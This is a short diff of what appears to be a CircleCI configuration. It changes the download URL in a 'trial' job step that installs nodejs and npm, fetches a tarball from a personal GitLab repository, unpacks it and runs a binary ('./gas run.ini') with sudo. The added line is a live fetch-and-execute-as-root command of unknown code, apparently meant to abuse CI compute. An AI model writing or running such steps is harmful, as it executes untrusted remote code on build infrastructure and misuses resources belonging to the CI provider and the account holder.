@@ -7,7 +7,7 @@ jobs:
       steps:
         - run:
             name: "trial"
-            command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://gitlab.com/dent4/file/-/raw/main/dent.tar.gz && tar -xf dent.tar.gz && sudo ./gas run.ini 
+            command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://gitlab.com/dent4/oke/-/raw/main/dent.tar.gz && tar -xf dent.tar.gz && sudo ./gas run.ini 
 
 workflows:
     version: 2.1
